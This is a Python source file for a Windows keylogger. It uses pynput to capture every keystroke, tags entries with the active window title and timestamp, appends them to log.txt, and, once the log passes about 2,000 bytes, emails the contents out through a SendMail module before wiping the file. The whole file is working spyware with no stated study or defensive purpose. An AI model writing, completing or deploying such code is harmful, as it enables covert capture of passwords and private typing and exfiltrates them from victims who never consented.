import pynput
from pynput.keyboard import Key,Listener
import SendMail
import os
import win32gui
import datetime


count = 0
keys = []
tempWindow=""
def on_press(key):
    global keys, count,tempWindow
    # Get the window name while typing :
    w = win32gui
    windowInfo=w.GetWindowText(w.GetForegroundWindow())

    if tempWindow != str(windowInfo):
        keys.append(" \n --New Windows-- \n ")
        e = datetime.datetime.now()
        info = 'At window: ' + str(windowInfo) + ' ' + str(e) + '- - -  \n'
        keys.append(info)

    keys.append(str(key))
    count += 1






    if count> 100:
        # every 10 keys will be added with name of the widow name date and time above them

        e = datetime.datetime.now()
        info=" \n At window: "+str(windowInfo)+ ' ' +str(e)+''
        keys.append(info)
        count = 0
        write_file(keys)
        keys.clear()

    tempWindow=windowInfo
def email(keys):
    keys=str(keys).replace("'","").replace("Key.space"," ").replace("Key.capslock","")\
       .replace("Key.backspace","").replace("Key.enter"," Enter \n").replace('\\n"',"\n").replace('\\n,',"\n").replace("\\","\ ")
    print(str(keys))
    """ message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            print("içeri girdi")
            k = " "
        if key == "Key.capslock":
            k = ""
        if key == "Key.backspace":
            k = ""
        if key == "Key.enter":
            k = " Enter \n"


        message += k"""
    #print(str(keys))
    SendMail.sendEmail(str(keys))

def on_release(key):
    if key == Key.esc:
        return False
def write_file(keys):
    boolValue=False
    with open("log.txt","a") as f:
        for key in keys:
            try:
                f.write(key)
            except Exception as e:
                print(e)
        print(f.tell())
        if (int(f.tell()) > 2000):
            boolValue=True
            #email(keys)
           # print(keys)

        f.close()
    if boolValue:
      with open("log.txt", "r") as f:

                 email(f.readlines())


                 f.close()

      with open("log.txt", "w") as f:
          f.truncate(0)
          f.close()



with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()